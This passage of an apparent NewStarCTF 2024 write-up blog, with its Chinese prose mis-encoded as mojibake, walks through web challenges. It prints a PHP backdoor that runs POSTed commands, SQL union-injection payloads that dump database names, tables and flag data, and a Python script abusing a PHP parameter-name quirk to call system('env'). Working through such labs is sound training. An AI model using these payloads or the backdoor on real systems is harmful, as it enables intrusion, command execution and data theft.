		data-flex-basis="457px"
	
></p>
<p>ç¬¬å››å…³ï¼šbanJS</p>
<p><img src="/p/newstarctf2024/image-20250703163001530.png"
	width="1785"
	height="592"
	srcset="/p/newstarctf2024/image-20250703163001530_hu15424714605639745337.png 480w, /p/newstarctf2024/image-20250703163001530_hu5066584481426800601.png 1024w"
	loading="lazy"
	
		alt="image-20250703163001530"
	
	
		class="gallery-image" 
		data-flex-grow="301"
		data-flex-basis="723px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250703163016556.png"
	width="991"
	height="550"
	srcset="/p/newstarctf2024/image-20250703163016556_hu1832041480814070598.png 480w, /p/newstarctf2024/image-20250703163016556_hu10068664093230608470.png 1024w"
	loading="lazy"
	
		alt="image-20250703163016556"
	
	
		class="gallery-image" 
		data-flex-grow="180"
		data-flex-basis="432px"
	
></p>
<h3 id="æ™ºæ¢°å±æœº">æ™ºæ¢°å±æœº
</h3><h4 id="çŸ¥è¯†ç‚¹robotstxtä»£ç å®¡è®¡">çŸ¥è¯†ç‚¹ï¼šrobots.txtã€ä»£ç å®¡è®¡
</h4><p>robots.txtåè¿›/backd0or.php</p>
<p>ç„¶åå®¡è®¡ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function execute_cmd($cmd) {
</span></span><span class="line"><span class="cl">    system($cmd);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function decrypt_request($cmd, $key) {
</span></span><span class="line"><span class="cl">    $decoded_key = base64_decode($key);
</span></span><span class="line"><span class="cl">    $reversed_cmd = &#39;&#39;;
</span></span><span class="line"><span class="cl">    for ($i = strlen($cmd) - 1; $i &gt;= 0; $i--) {
</span></span><span class="line"><span class="cl">        $reversed_cmd .= $cmd[$i];
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    $hashed_reversed_cmd = md5($reversed_cmd);
</span></span><span class="line"><span class="cl">    if ($hashed_reversed_cmd !== $decoded_key) {
</span></span><span class="line"><span class="cl">        die(&#34;Invalid key&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    $decrypted_cmd = base64_decode($cmd);
</span></span><span class="line"><span class="cl">    return $decrypted_cmd;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if (isset($_POST[&#39;cmd&#39;]) &amp;&amp; isset($_POST[&#39;key&#39;])) {
</span></span><span class="line"><span class="cl">    execute_cmd(decrypt_request($_POST[&#39;cmd&#39;],$_POST[&#39;key&#39;]));
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">else {
</span></span><span class="line"><span class="cl">    highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè‡ªå·±æ‰‹æ“ä¸€ä¸ªè„šæœ¬</p>
<p><img src="/p/newstarctf2024/image-20250703165733275.png"
	width="1057"
	height="757"
	srcset="/p/newstarctf2024/image-20250703165733275_hu2574795530847481354.png 480w, /p/newstarctf2024/image-20250703165733275_hu13085550756879922671.png 1024w"
	loading="lazy"
	
		alt="image-20250703165733275"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="335px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250703165718058.png"
	width="1232"
	height="1156"
	srcset="/p/newstarctf2024/image-20250703165718058_hu8999047978523073981.png 480w, /p/newstarctf2024/image-20250703165718058_hu5004411293045614516.png 1024w"
	loading="lazy"
	
		alt="image-20250703165718058"
	
	
		class="gallery-image" 
		data-flex-grow="106"
		data-flex-basis="255px"
	
></p>
<h3 id="è°¢è°¢çš®è›‹">è°¢è°¢çš®è›‹
</h3><h4 id="çŸ¥è¯†ç‚¹sqlè”åˆæ³¨å…¥">çŸ¥è¯†ç‚¹ï¼šsqlè”åˆæ³¨å…¥
</h4><p>æŠ“åŒ…å‘ç°æ˜¯postä¼ idï¼Œç„¶åidä¼šåšä¸€ä¸ªbase64åŠ urlç¼–ç ã€‚</p>
<p>æ˜¯æ•°å­—å‹ï¼Œä¸éœ€è¦&rsquo;åˆ†å‰²</p>
<p>å…ˆæ˜¯åˆ¤æ–­æ®µå­—æ®µæ•°ï¼Œ2çš„æ—¶å€™æ²¡æŠ¥é”™ï¼Œ3æŠ¥é”™äº†ï¼Œæ‰€ä»¥å­—æ®µæ•°æ˜¯2</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 order by 2
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250703213630742.png"
	width="895"
	height="444"
	srcset="/p/newstarctf2024/image-20250703213630742_hu17740239899875462468.png 480w, /p/newstarctf2024/image-20250703213630742_hu10077450623122971089.png 1024w"
	loading="lazy"
	
		alt="image-20250703213630742"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<p>åº“å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1, database()
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250703214057804.png"
	width="782"
	height="419"
	srcset="/p/newstarctf2024/image-20250703214057804_hu9954500847759654349.png 480w, /p/newstarctf2024/image-20250703214057804_hu3952251656238856313.png 1024w"
	loading="lazy"
	
		alt="image-20250703214057804"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>
<p>è¡¨å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250703214957492.png"
	width="939"
	height="471"
	srcset="/p/newstarctf2024/image-20250703214957492_hu15733656622194466376.png 480w, /p/newstarctf2024/image-20250703214957492_hu10630699378484152300.png 1024w"
	loading="lazy"
	
		alt="image-20250703214957492"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="478px"
	
></p>
<p>æŸ¥çœ‹Fl4gçš„åˆ—å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;Fl4g&#39; and table_schema=database()#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250703220038052.png"
	width="794"
	height="441"
	srcset="/p/newstarctf2024/image-20250703220038052_hu18346936810441082000.png 480w, /p/newstarctf2024/image-20250703220038052_hu15969150269773835973.png 1024w"
	loading="lazy"
	
		alt="image-20250703220038052"
	
	
		class="gallery-image" 
		data-flex-grow="180"
		data-flex-basis="432px"
	
></p>
<p>æŸ¥çœ‹deså’Œvalueçš„æ•°æ®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select group_concat(des),group_concat(value) from Fl4g#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250703220236960.png"
	width="1027"
	height="485"
	srcset="/p/newstarctf2024/image-20250703220236960_hu16797785760913290998.png 480w, /p/newstarctf2024/image-20250703220236960_hu7357430469979433600.png 1024w"
	loading="lazy"
	
		alt="image-20250703220236960"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="508px"
	
></p>
<p>sqlmapè·‘ä¸å‡ºæ¥ï¼Œä¼°è®¡æœ‰ä¸€äº›é™åˆ¶</p>
<h2 id="week2">Week2
</h2><h3 id="pangbai-è¿‡å®¶å®¶2">PangBai è¿‡å®¶å®¶ï¼ˆ2ï¼‰
</h3><h4 id="çŸ¥è¯†ç‚¹gitæ³„éœ²phpå¼‚å¸¸ä¼ å‚å˜é‡å">çŸ¥è¯†ç‚¹ï¼šgitæ³„éœ²ã€phpå¼‚å¸¸ä¼ å‚å˜é‡åã€
</h4><p>dirsearchæ‰«å‡º.git</p>
<p><img src="/p/newstarctf2024/image-20250703220651911.png"
	width="1376"
	height="732"
	srcset="/p/newstarctf2024/image-20250703220651911_hu5357642157582033133.png 480w, /p/newstarctf2024/image-20250703220651911_hu4958929876449761628.png 1024w"
	loading="lazy"
	
		alt="image-20250703220651911"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="451px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250703220909939.png"
	width="846"
	height="556"
	srcset="/p/newstarctf2024/image-20250703220909939_hu14798851379137171979.png 480w, /p/newstarctf2024/image-20250703220909939_hu12796352014736491584.png 1024w"
	loading="lazy"
	
		alt="image-20250703220909939"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250703221013773.png"
	width="629"
	height="207"
	srcset="/p/newstarctf2024/image-20250703221013773_hu12858276429679710001.png 480w, /p/newstarctf2024/image-20250703221013773_hu3558885595153783569.png 1024w"
	loading="lazy"
	
		alt="image-20250703221013773"
	
	
		class="gallery-image" 
		data-flex-grow="303"
		data-flex-basis="729px"
	
></p>
<p>ç”¨GitHackè¿˜åŸä¸€ä¸‹ï¼Œä¸è¿‡è¿˜åŸå‡ºæ¥çš„éƒ½æ˜¯ä¸€äº›å‰ç«¯ï¼Œæ²¡å•¥ç”¨ï¼Œå†é‚£ä¸ªç”¨<code>git log</code>çœ‹æäº¤å†å²ï¼Œ<code>git stash apply</code>æ›´æ–°åˆ†æ”¯ï¼Œ<code>git add +æ–‡ä»¶å</code>æ¢å¤æ–‡ä»¶</p>
<p><img src="/p/newstarctf2024/image-20250703223745281.png"
	width="620"
	height="587"
	srcset="/p/newstarctf2024/image-20250703223745281_hu9756684290707579261.png 480w, /p/newstarctf2024/image-20250703223745281_hu4148027784244691011.png 1024w"
	loading="lazy"
	
		alt="image-20250703223745281"
	
	
		class="gallery-image" 
		data-flex-grow="105"
		data-flex-basis="253px"
	
></p>
<p>å‡½æ•°æ˜¯è¿™æ ·çš„</p>
<p><img src="/p/newstarctf2024/image-20250703223930398.png"
	width="876"
	height="152"
	srcset="/p/newstarctf2024/image-20250703223930398_hu15747457398256153434.png 480w, /p/newstarctf2024/image-20250703223930398_hu16079450259662815552.png 1024w"
	loading="lazy"
	
		alt="image-20250703223930398"
	
	
		class="gallery-image" 
		data-flex-grow="576"
		data-flex-basis="1383px"
	
></p>
<p>åº”è¯¥æ˜¯æ¶‰åŠåˆ°ä¸€ä¸ª</p>
<p>phpå˜é‡åå’Œ%0aç»•è¿‡ï¼Œå†™ä¸ªä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">url=&#39;http://192.168.183.1:53781/BacKd0or.vubjeVv3GZwDWHK3.php?NewStar[CTF.2024=Welcome%0a&#39;
</span></span><span class="line"><span class="cl">data={&#39;papa&#39;:&#39;doKcdnEOANVB&#39;,&#39;func&#39;:&#39;system&#39;,&#39;args&#39;:&#39;env&#39;}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">res=requests.post(url=url,data=data,)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">print(res.text)
</span></span></code></pre></td></tr></table>
</div>
</div><p>â€‹	è¿™é‡Œå˜é‡åä»<code>NewStar_CTF.2024</code>å˜æˆ<code>NewStar[CTF.2024</code>ï¼Œæ˜¯å› ä¸ºphpçš„å˜é‡åé‡Œåªæœ‰æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ã€‚å¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€.ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸ºä¸‹åˆ’çº¿</p>
<p>â€‹	ä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸ºä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p>
<p>â€‹	ç„¶åæ˜¯%0aç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯PCREå¤šæ¬¡å›æº¯ç»•è¿‡ï¼Œåæ¥æƒ³æƒ³å¦‚æœæ˜¯é‚£æ ·çš„è¯ï¼Œå‰é¢çš„åˆç»•ä¸è¿‡äº†ã€‚</p>
<p><img src="/p/newstarctf2024/image-20250704130215729.png"
	width="1234"
	height="1058"
	srcset="/p/newstarctf2024/image-20250704130215729_hu2936882048912518973.png 480w, /p/newstarctf2024/image-20250704130215729_hu6159411535405370478.png 1024w"
	loading="lazy"
	
		alt="image-20250704130215729"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="279px"
	
></p>
<h3 id="ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—">ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—
</h3><h4 id="çŸ¥è¯†ç‚¹pythonè„šæœ¬ç¼–å†™">çŸ¥è¯†ç‚¹ï¼špythonè„šæœ¬ç¼–å†™
</h4><p>ä¸€ä¸ªè„šæœ¬é¢˜ï¼Œç‚¹äº†å¼€å§‹ä¹‹åå°±ä¸èƒ½f12äº†ï¼Œä¸è¿‡é¼ æ ‡æ”¾åœ¨urlå¤„ï¼Œå†ç‚¹f12å°±å¯ä»¥æˆåŠŸ</p>
<p>ç„¶ååˆ†æjsä»£ç ï¼Œå‘ç°æ˜¯åœ¨/startè·¯ç”±ç»™è‹±æ–‡æ–‡æœ¬ï¼Œåœ¨/submitè·¯ç”±æäº¤ã€‚å¯ä»¥ç”¨aiè°ƒä¸€ä¸ªä»£ç å‡ºæ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fetch_and_submit</span><span class="p">(</span><span class="n">base_url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ä» /start è·å–æ–‡æœ¬å¹¶æäº¤åˆ° /submit&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># ç¬¬ä¸€é˜¶æ®µï¼šä» /start è·å–è‹±æ–‡æ–‡æœ¬</span>
</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] è®¿é—® </span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/start è·å–æ–‡æœ¬...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">start_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/start&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">start_response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># è§£æHTMLè·å–æ–‡æœ¬</span>
</span></span><span class="line"><span class="cl">        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">start_response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">text_container</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s1">&#39;text&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">text_container</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># å°è¯•ä»JavaScriptå˜é‡ä¸­æå–</span>
</span></span><span class="line"><span class="cl">            <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;p\(({.*?})\)&#39;</span><span class="p">,</span> <span class="n">start_response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">json_str</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">]</span>  <span class="c1"># è·å–ç¬¬ä¸€æ¡æ–‡æœ¬</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] ä»JSå˜é‡ä¸­æå–åˆ°æ–‡æœ¬: </span><span class="si">{</span><span class="n">text</span><span class="p">[:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] æ— æ³•è§£æJSä¸­çš„æ–‡æœ¬æ•°æ®&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] æœªæ‰¾åˆ°æ–‡æœ¬å®¹å™¨ #text&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">=</span> <span class="n">text_container</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] è·å–åˆ°æ–‡æœ¬: </span><span class="si">{</span><span class="n">text</span><span class="p">[:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ç¬¬äºŒé˜¶æ®µï¼šæäº¤åˆ° /submit</span>
</span></span><span class="line"><span class="cl">        <span class="n">submit_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/submit&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] æäº¤æ–‡æœ¬åˆ° </span><span class="si">{</span><span class="n">submit_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ¨¡æ‹ŸJavaScriptä¸­çš„æäº¤é€»è¾‘</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user_input&#39;</span><span class="p">:</span> <span class="n">text</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">submit_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">submit_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">submit_response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] æäº¤æˆåŠŸ! çŠ¶æ€ç : </span><span class="si">{</span><span class="n">submit_response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] æ€»è€—æ—¶: </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">ç§’&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥å“åº”ç»“æœ</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;æäº¤æˆåŠŸ&#34;</span> <span class="ow">in</span> <span class="n">submit_response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] æœåŠ¡å™¨ç¡®è®¤æäº¤æˆåŠŸ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">submit_response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] å‘ç°flag:&#34;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;flag{.*?}&#34;</span><span class="p">,</span> <span class="n">submit_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] æœªçŸ¥å“åº”å†…å®¹&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;response.html&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">submit_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
